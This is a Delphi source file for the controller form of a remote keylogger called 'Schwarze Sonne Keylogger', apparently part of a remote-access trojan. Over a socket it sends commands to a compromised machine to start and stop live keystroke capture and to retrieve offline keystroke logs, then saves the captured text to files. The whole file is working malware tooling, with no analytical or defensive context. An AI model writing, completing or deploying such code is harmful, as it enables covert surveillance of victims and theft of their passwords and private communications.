unit uKeylogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, winsock, ShellApi;

type
  TForm10 = class(TForm)
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    redt1: TRichEdit;
    stat1: TStatusBar;
    redt2: TRichEdit;
    pb1: TProgressBar;
    PngBitBtn1: TBitBtn;
    PngBitBtn2: TBitBtn;
    PngBitBtn4: TBitBtn;
    BitBtn1: TBitBtn;
    BitBtn2: TBitBtn;
    SaveDialog1: TSaveDialog;
    CheckBox1: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure PngBitBtn1Click(Sender: TObject);
    procedure PngBitBtn2Click(Sender: TObject);
    procedure PngBitBtn4Click(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

procedure LogtoFile(AString: string; FileName: String);
var
  AFile: TextFile;
begin
  AssignFile(AFile, FileName);
  ReWrite(AFile);
  WriteLn(AFile, AString);
  CloseFile(AFile);
end;

procedure TForm10.BitBtn1Click(Sender: TObject);
begin
  SaveDialog1.InitialDir := ExtractFilePath(ParamStr(0));
  SaveDialog1.FileName := 'OnlineKeylog.txt';
  if not SaveDialog1.Execute then exit;
  LogtoFile(redt1.Text, SaveDialog1.FileName);
end;

procedure TForm10.BitBtn2Click(Sender: TObject);
begin
  SaveDialog1.InitialDir := ExtractFilePath(ParamStr(0));
  SaveDialog1.FileName := 'OfflineKeylog.txt';
  if not SaveDialog1.Execute then exit;
  LogtoFile('Schwarze Sonne Keylogger ' + '[' + timetostr(time) + ' ' + datetostr(date) + ']' + #13 + #10 + #13 + #10 + redt2.Text, SaveDialog1.FileName);
end;

procedure TForm10.FormCreate(Sender: TObject);
begin
redt1.Text := '';
redt2.Text := '';
end;

procedure TForm10.PngBitBtn1Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
  Data := '30|'+#10;
  Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
    PngBitBtn4.Enabled := False;
    PngBitBtn2.Enabled := True;
    PngBitBtn1.Enabled := False;
end;

procedure TForm10.PngBitBtn2Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
  Data := '31|'+#10;
  Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
  PngBitBtn4.Enabled := True;
  PngBitBtn1.Enabled := True;
  PngBitBtn2.Enabled := False;
end;

procedure TForm10.PngBitBtn4Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
  Data := '42|' + Stat1.Panels[0].Text+#10;
  Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
end;

end.
